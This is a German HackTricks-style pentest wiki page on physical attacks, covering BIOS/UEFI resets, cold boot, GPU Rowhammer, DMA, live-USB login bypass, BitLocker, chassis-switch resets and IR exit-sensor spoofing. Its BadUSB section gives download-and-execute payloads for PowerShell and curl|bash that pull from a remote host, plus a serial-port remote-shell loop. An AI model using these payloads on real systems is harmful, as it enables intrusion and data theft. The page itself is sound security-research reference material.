# Physische Angriffe

{{#include ../banners/hacktricks-training.md}}

## BIOS-Passwortwiederherstellung und Systemsicherheit

Einstellungen der Firmware älterer PCs können durch Trennen der CMOS-Batterie oder mithilfe eines dokumentierten Clear-CMOS-Jumpers zurückgesetzt werden. Die erforderliche Zeit ohne Strom ist boardspezifisch, und moderne UEFI-Passwörter oder -Schlüssel können im nichtflüchtigen Flash-Speicher, einem Embedded Controller oder einem Sicherheitsgerät gespeichert sein und daher das Entfernen der Batterie überstehen. Konsultieren Sie vor dem Überbrücken von Pins das Board- oder Servicehandbuch; dieses Verfahren kann außerdem TPM-Messungen ungültig machen und eine Wiederherstellung der Festplattenverschlüsselung auslösen.

Auf älteren x86-Systemen können Tools wie **killCMOS** und **CmosPwd** CMOS-gesicherte Einstellungen aus einer bootfähigen Umgebung untersuchen oder ändern. CmosPwd erkennt Passwortformate aus einer dokumentierten Reihe älterer BIOS-Familien und kann den CMOS-Zustand sichern, wiederherstellen oder löschen/beenden; die veröffentlichten Builds zielen auf ältere DOS/Windows-, Linux-, FreeBSD- und NetBSD-Umgebungen ab.<sup>[[18]](#references)</sup> Diese Dienstprogramme sind keine universellen UEFI-Passwortentferner und erfordern ausreichenden Hardware-/Firmware-Zugriff.

Einige Laptop-Firmwares zeigen nach mehreren fehlgeschlagenen Passwortversuchen einen herstellerspezifischen Challenge-Code an. Datenbanken wie [bios-pw.org](https://bios-pw.org) können für einige Modelle Wiederherstellungspasswörter älterer Hersteller ableiten, viele Systeme implementieren jedoch eine Sperre ohne ableitbaren Challenge-Code. Betrachten Sie jedes generierte Passwort als modellspezifisch und vermeiden Sie es, permanente Versuchszähler auszuschöpfen.

### UEFI-Sicherheit

Für moderne **UEFI**-Systeme kann CHIPSEC den Schutz von Secure-Boot-Variablen prüfen. Beginnen Sie mit der folgenden Prüfung ohne Änderungen; der optionale Modus `-a modify` versucht absichtlich, Variablen zu beschädigen, und sollte nur auf einem wiederherstellbaren Laborsystem verwendet werden. CHIPSEC weist selbst darauf hin, dass sein privilegierter Treiber und der hardwarenahe Zugriff für Produktionsendgeräte ungeeignet sind.<sup>[[11]](#references)</sup>
```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```
---

## RAM-Analyse und Cold-Boot-Angriffe

DRAM verliert nicht jedes Bit sofort, wenn die Auffrischung stoppt. Die Zerfallsrate variiert erheblich je nach Modultechnologie und Temperatur; Kühlung kann nützliche Daten deutlich länger bewahren als ein ungekühlter Power Cycle. Ein Cold-Boot-Angriff startet schnell neu in eine kleine Acquisition-Umgebung oder überträgt ein gekühltes Modul, erfasst den Rohspeicher und rekonstruiert trotz Bitzerfall kryptografische Schlüssel. Ein Tool zum Kopieren von Datenträgern ist nicht automatisch ein Imager für den physischen Speicher, und Volatility analysiert einen Capture, anstatt ihn zu erfassen; verwende ein plattformgeeignetes, validiertes Acquisition-Tool.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer gegen Page Tables

Moderne GPU-Rowhammer-Angriffe werden wesentlich nützlicher, wenn sie **GPU-Virtual-Memory-Metadaten** anstelle gewöhnlicher Buffer angreifen. Aktuelle Arbeiten zu **GDDR6-NVIDIA-Ampere-GPUs** zeigen, dass ein Angreifer, der nicht privilegierten CUDA-Code ausführt, GPU-spezifische Hammering-Muster erstellen, mithilfe von **Memory Massaging** Paging-Strukturen in anfälligen Zeilen platzieren und anschließend Bits in der **Last-Level-Page-Table** oder einem intermediären **Page Directory** flippen kann. Sobald ein einzelner Translation-Eintrag beschädigt ist, kann der Angreifer **beliebiges Lesen/Schreiben im GPU-Speicher** ermöglichen und anschließend zum Host-Kompromittieren pivotieren.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. **Hammerbare Zeilen profilieren** in GDDR6 und refresh-bewusste / nicht uniforme Hammering-Muster erstellen, die In-DRAM-Mitigations umgehen.
2. **GPU-Allokationen massieren**, sodass der Treiber Page-Translation-Strukturen in hammerbaren physischen Bereichen platziert, anstatt sie im standardmäßig geschützten Pool zu belassen. In der Praxis kann dies bedeuten, den Low-Memory-Page-Table-Bereich zu erschöpfen und große, sparse UVM-Mappings mit kontrollierten Strides zu sprühen.
3. **Translation-Metadaten flippen**, etwa **PFN**- oder aperture-bezogene Bits innerhalb eines Page-Table- / Page-Directory-Eintrags, sodass die vom Angreifer kontrollierte virtuelle Page zu Page-Table-Pages, beliebigem GPU-Speicher oder für den Host sichtbaren System-Mappings aufgelöst wird.
4. Das gefälschte Mapping wiederverwenden, um zusätzliche Translation-Einträge umzuschreiben und auf **beliebiges Lesen/Schreiben im GPU-Speicher** über mehrere GPU-Kontexte hinweg zu eskalieren.

### Host-Pivot und Mitigations

- Bei **deaktiviertem IOMMU** können gefälschte System-Aperture-Mappings beliebigen **physischen Host-Speicher** für die GPU offenlegen und das GPU-Primitive in eine vollständige Host-Kompromittierung verwandeln.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** zielt auf Last-Level-Page-Table-Einträge, während **GeForge** zeigt, dass die Beschädigung einer Page-Directory-Ebene einfacher sein kann, weil ein einzelner Bit-Flip einen größeren Translation-Teilbaum neu ausrichten kann. Betrachte daher nicht nur eine Paging-Ebene als sicherheitskritisch.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bleibt wichtig, weil es den direkten Pfad zu beliebigem Host-Speicher blockiert, der von GDDRHammer/GeForge verwendet wird, ist aber **keine vollständige Mitigation**. **GPUBreach** zeigt einen Pivot der zweiten Stufe, bei dem der Angreifer GPU-schreibbare, treibereigene CPU-Buffer beschädigt und anschließend NVIDIA-Treiber-Memory-Safety-Bugs auslöst, um ein Kernel-Write-Primitive und eine **Root-Shell** zu erhalten, selbst wenn IOMMU aktiviert ist.<sup>[[3]](#references)</sup>
- **System-Level-ECC** ist ein praktikabler Hardening-Schritt auf unterstützten Workstation-/Server-GPUs. Consumer-GPUs ohne ECC bieten eine schwächere Abwehrfläche.<sup>[[4]](#references)</sup>
- Diese Angriffe sind nicht rein theoretisch: **GeForge** meldete **1.171** Bit-Flips auf einer RTX 3060 und **202** auf einer RTX A6000, was ausreichte, um eine funktionierende Kette zur Erhöhung von Host-Privilegien aufzubauen.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA)-Angriffe

Für Offline-Patching von UEFI IFR/NVRAM, das die IOMMU-Durchsetzung vor dem Booten herabstufen und eine Windows-DMA-Kette aktivieren kann, siehe:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstriert **DMA-basierte Speichererfassung und -manipulation** über Schnittstellen wie FireWire und frühe Thunderbolt-Konfigurationen, einschließlich historischer Login-Bypass-Signaturen. Es ist nicht einfach „gegen Windows 10 unwirksam“: Die Ausnutzbarkeit hängt von der Schnittstelle, dem Target-Build, der IOMMU-Richtlinie, dem Sperrstatus sowie davon ab, ob Windows Kernel DMA Protection unterstützt und aktiviert ist. Windows 10 Version 1803 und später führten Kernel DMA Protection auf kompatiblen Plattformen ein und veränderten dadurch die Angriffsfläche erheblich.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live-CD/USB für Systemzugriff

Auf einem unverschlüsselten oder bereits entsperrten Windows-Volume kann eine Offline-Umgebung Accessibility-Binaries wie **sethc.exe** oder **Utilman.exe** durch **cmd.exe** ersetzen, wodurch eine SYSTEM-Eingabeaufforderung entsteht, wenn die entsprechende Tastenkombination auf dem Anmeldebildschirm ausgeführt wird. Tools wie **chntpw** können lokale SAM-Kontodaten bearbeiten. Diese Methoden umgehen kein gesperrtes BitLocker-Volume und können mit DPAPI/EFS geschützte Zugangsdaten beschädigen; bewahre forensische Kopien und Backups auf.

**Kon-Boot** ist ein kommerzielles Tool zum Umgehen der Authentifizierung zur Bootzeit für unterstützte Windows-/macOS-Konfigurationen. Die Kompatibilität hängt vom Betriebssystem, Firmware-Modus, Secure Boot und der Festplattenverschlüsselung ab; ein BitLocker-gesperrtes Volume wird nicht entschlüsselt.<sup>[[10]](#references)</sup>

---

## Umgang mit Windows-Sicherheitsfunktionen

### Boot- und Recovery-Tastenkombinationen

- **Delete/Supr**, F2, F10 oder eine andere Herstellertaste kann das Firmware-Setup öffnen.
- **F8** öffnet die erweiterten Windows-Bootoptionen älterer Systeme nur auf Konfigurationen, auf denen dieser Pfad noch aktiviert ist; der aktuelle Einstieg in die Recovery-Umgebung variiert.
- Das Gedrückthalten von **Shift** kann die automatische Windows-Anmeldung in einigen Konfigurationen unterdrücken, obwohl Richtlinien-/Registry-Einstellungen dieses Verhalten deaktivieren können.<sup>[[17]](#references)</sup>

### BAD-USB-Geräte

Geräte wie **USB Rubber Ducky** und Teensy-Boards können als vertrauenswürdige HID-Tastaturen enumerieren und vordefinierte Tastatureingaben injizieren. Das Payload verfügt anfänglich über die Berechtigungen und den Desktop-Zugriff der angemeldeten Sitzung; UAC-Eingabeaufforderungen, Bildschirmsperre, Tastaturlayout, Timing und die USB-Richtlinie des Endpunkts schränken es weiterhin ein.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator- oder Backup-Berechtigungen können eine Shadow Copy erstellen oder Registry-Hives speichern, sodass gesperrte Dateien wie **SAM** und **SYSTEM** erfasst werden können. Dies ist eine Collection-Technik nach der Kompromittierung und kein Privilege Bypass; sie sollte mit `diskshadow`-/VSS- und Registry-Hive-Export-Ereignissen korreliert werden.

## BadUSB / HID-Implantat-Techniken

### Über Wi-Fi verwaltete Kabel-Implants

- ESP32-S3-basierte Implants wie **Evil Crow Cable Wind** verbergen sich in USB-A→USB-C- oder USB-C↔USB-C-Kabeln, enumerieren ausschließlich als USB-Tastatur und stellen ihren C2-Stack über Wi-Fi bereit. Der Operator muss das Kabel lediglich über den Host des Opfers mit Strom versorgen, einen Hotspot namens `Evil Crow Cable Wind` mit dem Passwort `123456789` erstellen und [http://cable-wind.local/](http://cable-wind.local/) (oder dessen DHCP-Adresse) aufrufen, um die eingebettete HTTP-Schnittstelle zu erreichen.<sup>[[8]](#references)</sup>
- Die Browser-UI bietet Tabs für *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* und *Config*. Gespeicherte Payloads werden pro Betriebssystem markiert, Tastaturlayouts werden dynamisch gewechselt und VID/PID-Strings können geändert werden, um bekannte Peripheriegeräte nachzuahmen.
- Da sich der C2 im Kabel befindet, kann ein Telefon Payloads vorbereiten, deren Ausführung auslösen und Wi-Fi-Zugangsdaten verwalten, ohne das Netzwerk der Organisation zu verwenden – nützlich für physische Intrusionen mit kurzer Verweildauer.

### OS-bewusste AutoExec-Payloads

- AutoExec-Regeln binden ein oder mehrere Payloads, die unmittelbar nach der USB-Enumeration ausgelöst werden. Das Implantat führt ein leichtgewichtiges OS-Fingerprinting durch und wählt das passende Script aus.
- Beispiel-Workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) oder `CTRL ALT T` (Terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Da die Ausführung unbeaufsichtigt erfolgt, kann bereits das Austauschen eines Ladekabels einen initialen „Plug-and-Pwn“-Zugriff im Kontext des angemeldeten Benutzers ermöglichen.

### Über HID gestartete Remote Shell über Wi-Fi-TCP

1. **Keystroke-Bootstrap:** Ein gespeichertes Payload öffnet eine Konsole und fügt eine Schleife ein, die alles ausführt, was auf dem neuen USB-Serial-Gerät eintrifft. Eine minimale Windows-Variante lautet:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Kabelbrücke:** Das Implantat hält den USB-CDC-Kanal offen, während sein ESP32-S3 einen TCP-Client (Python-Skript, Android-APK oder Desktop-Executable) zurück zum Operator startet. Alle in die TCP-Sitzung eingegebenen Bytes werden in die oben beschriebene serielle Verbindung weitergeleitet, wodurch auch auf vom Netzwerk isolierten Hosts eine Remote Command Execution möglich ist. Die Ausgabe ist begrenzt, daher führen Operatoren typischerweise Befehle blind aus (Konten erstellen, zusätzliche Tools bereitstellen usw.).

### HTTP-OTA-Update-Oberfläche

- Die dokumentierte Evil Crow Cable Wind-Schnittstelle stellt unter `/update` einen nicht authentifizierten Firmware-Update-Endpunkt bereit:<sup>[[8]](#references)</sup>
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field Operators können Features während eines laufenden Einsatzes per Hot-Swap austauschen (z. B. die Firmware von flash USB Army Knife), ohne das Kabel zu öffnen. Dadurch kann das Implantat zu neuen Fähigkeiten wechseln, während es weiterhin mit dem Zielhost verbunden ist.

## Umgehen der BitLocker-Verschlüsselung

Eine autorisierte forensische Erfassung eines aktiven oder kürzlich ausgeführten Systems kann einen BitLocker-Volume-Masterschlüssel oder verwandtes Schlüsselmaterial enthalten, solange das Volume entsperrt ist. Kommerzielle Tools wie Elcomsoft Forensic Disk Decryptor und Passware Kit Forensic können unterstützte Speicherabbilder, Ruhezustandsdateien oder Crash-Dumps durchsuchen, der Erfolg ist jedoch nicht garantiert. Moderne Windows-Systeme verschlüsseln Crash-Dumps ebenfalls, wenn BitLocker aktiviert ist, und ein gespeichertes 48-stelliges Wiederherstellungspasswort ist ein anderes Artefakt als ein im Speicher befindlicher Volume-Schlüssel.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Social Engineering zum Hinzufügen eines Wiederherstellungsschlüssels

Ein Angreifer, der einen Administrator dazu bringt, BitLocker-Verwaltungsbefehle auszuführen, kann einen Wiederherstellungspasswort-, externen Schlüssel- oder anderen Protector hinzufügen und ihn anschließend abfangen. Ein Wiederherstellungspasswort kann keine beliebige Zeichenfolge aus Nullen sein: Numerische BitLocker-Wiederherstellungspasswörter müssen ein validiertes 48-stelliges Format haben. Die relevante Syntax für die autorisierte Administration lautet `manage-bde -protectors -add C: -recoverypassword`; die resultierenden Protectors werden mit `manage-bde -protectors -get C:` aufgelistet. Überwachen Sie das Hinzufügen von Protectors und stellen Sie sicher, dass neues Wiederherstellungsmaterial ausschließlich an genehmigten Speicherorten hinterlegt wird.<sup>[[16]](#references)</sup>

---

## Ausnutzen von Gehäuseöffnungs-/Wartungsschaltern zum Zurücksetzen des BIOS auf Werkseinstellungen

Viele moderne Laptops und Desktop-Computer im Small-Form-Factor-Format verfügen über einen **chassis-intrusion switch**, der vom Embedded Controller (EC) und der BIOS/UEFI-Firmware überwacht wird. Der primäre Zweck des Schalters besteht zwar darin, beim Öffnen eines Geräts einen Alarm auszulösen, manche Hersteller implementieren jedoch eine **undokumentierte Wiederherstellungsverknüpfung**, die ausgelöst wird, wenn der Schalter in einem bestimmten Muster betätigt wird.<sup>[[5]](#references)[[6]](#references)</sup>

### Funktionsweise des Angriffs

1. Der Schalter ist mit einem **GPIO interrupt** am EC verbunden.
2. Die auf dem EC ausgeführte Firmware verfolgt die **Zeitabstände und Anzahl der Betätigungen**.
3. Wenn ein fest codiertes Muster erkannt wird, ruft der EC eine *mainboard-reset*-Routine auf, die den **Inhalt des System-NVRAM/CMOS löscht**.
4. Beim nächsten Start laden betroffene Modelle einen zurückgesetzten Firmware-Zustand. Je nach Hersteller und Revision können zu den gelöschten Daten ein Supervisor-Passwort, benutzerdefinierte Booteinstellungen oder registrierte Secure-Boot-Schlüssel gehören; der Zustand des TPM und die Auswirkungen auf die Datenträgerverschlüsselung müssen separat bewertet werden.

> Ein Firmware-Reset kann Optionen zum Booten von externen Datenträgern wiederherstellen, entschlüsselt jedoch **keine** Speichermedien. BitLocker oder ein anderes System zur vollständigen Datenträgerverschlüsselung kann nach Änderungen am TPM oder an der Firmware in den Wiederherstellungsmodus wechseln und das interne Laufwerk ohne Wiederherstellungsschlüssel weiterhin schützen.<sup>[[16]](#references)</sup>

### Beispiel aus der Praxis – Framework 13 Laptop

Die Wiederherstellungsverknüpfung für das Framework 13 (11./12./13. Generation) lautet:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Nach dem zehnten Zyklus setzt die EC ein Flag, das das BIOS anweist, beim nächsten Neustart den NVRAM zu löschen. Der gesamte Vorgang dauert etwa 40 s und erfordert **nichts weiter als einen Schraubendreher**.<sup>[[5]](#references)</sup>

### Allgemeines Exploitationsverfahren

1. Schalte das Ziel ein oder führe einen Suspend-Resume-Vorgang durch, damit die EC läuft.
2. Entferne die untere Abdeckung, um den Intrusion-/Maintenance-Schalter freizulegen.
3. Wiederhole das anbieterspezifische Umschaltmuster (konsultiere die Dokumentation oder Foren oder reverse-engineere die EC-Firmware).
4. Baue das Gerät wieder zusammen und starte es neu. Prüfe anschließend, welche Firmware-Einstellungen und Zugangsdaten tatsächlich geändert wurden.
5. Falls autorisiert und externes Booten verfügbar ist, boote ein kontrolliertes Live-Image. Sobald ein internes Volume legitim entsperrt wurde (oder nie verschlüsselt war), kann die Live-Umgebung Zugangsdaten und Daten erfassen oder die EFI System Partition untersuchen. Das Ändern dieser Partition zur Installation eines EFI-Implants ist persistent und äußerst invasiv und bleibt durch Secure Boot, measured boot, Firmware-Schreibschutz und Endpoint-Monitoring eingeschränkt. Verschlüsselter Speicher bleibt ohne seinen Schlüssel oder Wiederherstellungsmaterial unzugänglich.

### Erkennung & Mitigation

* Protokolliere Chassis-Intrusion-Ereignisse in der OS-Management-Konsole und korreliere sie mit unerwarteten BIOS-Resets.
* Verwende **manipulationssichere Siegel** an Schrauben/Abdeckungen, um ein Öffnen zu erkennen.
* Bewahre Geräte in **physisch kontrollierten Bereichen** auf; gehe davon aus, dass physischer Zugriff einer vollständigen Kompromittierung entspricht.
* Deaktiviere, sofern verfügbar, die Funktion „Maintenance-Switch-Reset“ des Anbieters oder verlange eine zusätzliche kryptografische Autorisierung für NVRAM-Resets.

---

## Verdeckte IR-Injektion gegen No-Touch-Ausstiegssensoren

### Sensoreigenschaften
- Handelsübliche „Wave-to-Exit“-Sensoren kombinieren einen IR-LED-Emitter mit einem Empfängermodul im Stil einer TV-Fernbedienung, das erst dann logisch high meldet, wenn es mehrere Impulse (~4–10) des korrekten Trägers (≈30 kHz) erkannt hat.<sup>[[7]](#references)</sup>
- Eine Kunststoffabdeckung verhindert, dass Emitter und Empfänger direkt aufeinander ausgerichtet sind. Daher nimmt der Controller an, dass jeder validierte Träger von einer nahegelegenen Reflexion stammt, und steuert ein Relais an, das den Türöffner aktiviert.
- Sobald der Controller annimmt, dass ein Ziel vorhanden ist, ändert er häufig die Modulationshüllkurve am Ausgang. Der Empfänger akzeptiert jedoch weiterhin jeden Burst, der dem gefilterten Träger entspricht.

### Angriffsablauf
1. **Emissionsprofil erfassen** – Schließe einen Logikanalysator an die Controller-Pins an, um sowohl die Wellenformen vor der Erkennung als auch die danach aufzuzeichnen, die die interne IR-LED ansteuern.
2. **Nur die Wellenform „nach der Erkennung“ wiedergeben** – Entferne den werksseitigen Emitter oder ignoriere ihn und steuere eine externe IR-LED von Anfang an mit dem bereits ausgelösten Muster an. Da der Empfänger nur Impulsanzahl und Frequenz berücksichtigt, behandelt er den gefälschten Träger als echte Reflexion und aktiviert die Relaisleitung.
3. **Die Übertragung takten** – Übertrage den Träger in abgestimmten Bursts (z. B. einige zehn Millisekunden ein, ähnlich lange aus), um die minimale Impulsanzahl zu liefern, ohne die AGC des Empfängers oder dessen Logik zur Interferenzbehandlung zu übersteuern. Eine kontinuierliche Emission sättigt den Sensor schnell und verhindert, dass das Relais auslöst.

### Reflektierende Injektion über große Entfernung
- Das Ersetzen der Labor-LED durch eine leistungsstarke IR-Diode, einen MOSFET-Treiber und fokussierende Optik ermöglicht eine zuverlässige Auslösung aus etwa 6 m Entfernung.
- Der Angreifer benötigt keine direkte Sichtverbindung zur Empfängeröffnung. Wird der Strahl auf Innenwände, Regale oder Türrahmen gerichtet, die durch Glas sichtbar sind, kann die reflektierte Energie in das Sichtfeld von etwa 30° gelangen und eine Handbewegung aus kurzer Entfernung nachahmen.
- Da die Empfänger nur schwache Reflexionen erwarten, kann ein deutlich stärkerer externer Strahl von mehreren Oberflächen abprallen und dennoch oberhalb der Erkennungsschwelle bleiben.

### Bewaffnete Angriffstaschenlampe
- Wenn der Treiber in einer handelsüblichen Taschenlampe untergebracht wird, bleibt das Tool unauffällig. Ersetze die sichtbare LED durch eine leistungsstarke IR-LED, die auf das Band des Empfängers abgestimmt ist, füge einen ATtiny412 (oder eine ähnliche Komponente) zur Erzeugung der ≈30-kHz-Bursts hinzu und verwende einen MOSFET, um den LED-Strom zu schalten.
- Eine teleskopische Zoomlinse bündelt den Strahl für Reichweite und Präzision, während ein Vibrationsmotor unter MCU-Steuerung haptisch bestätigt, dass die Modulation aktiv ist, ohne sichtbares Licht auszusenden.
- Das Durchlaufen mehrerer gespeicherter Modulationsmuster (mit leicht unterschiedlichen Trägerfrequenzen und Hüllkurven) erhöht die Kompatibilität mit verschiedenen umgelabelten Sensorfamilien. Dadurch kann der Bediener reflektierende Oberflächen absuchen, bis das Relais hörbar klickt und die Tür freigibt.

---

## References

- [1] [GDDRHammer: Stark störende DRAM-Zeilen — komponentenübergreifende Rowhammer-Angriffe auf moderne GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GDDR-Speicher hämmern, um GPU-Seitentabellen zum Spaß und Profit zu fälschen](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege-Escalation-Angriffe auf GPUs mittels Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Sicherheitshinweis: Rowhammer - Juli 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Drücke hier, um zu pwnen“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Anleitung zum Zurücksetzen des Mainboards](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Nein, keine Berührung! – Umgehen von IR-No-Touch-Ausstiegssensoren mit einer verdeckten IR-Taschenlampe“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Einstecken, starten, pwnen: Hacking mit Evil Crow Cable Wind“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer-Angriff auf NVIDIA-Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Offizielle Dokumentation und Kompatibilitätsinformationen zu Kon-Boot](https://kon-boot.com/)
- [11] [CHIPSEC-Dokumentation - Schutzmechanismen für Secure-Boot-Variablen](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Damit wir uns erinnern: Cold-Boot-Angriffe auf Verschlüsselungsschlüssel](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - Manipulation des physischen Speichers über DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel-DMA-Schutz](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentation zu Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Anleitung zu BitLocker-Vorgängen](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Verhalten beim Gedrückthalten der Umschalttaste und bei der automatischen Anmeldung](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd-Dokumentation und Downloads](https://www.cgsecurity.org/wiki/CmosPwd)
{{#include ../banners/hacktricks-training.md}}
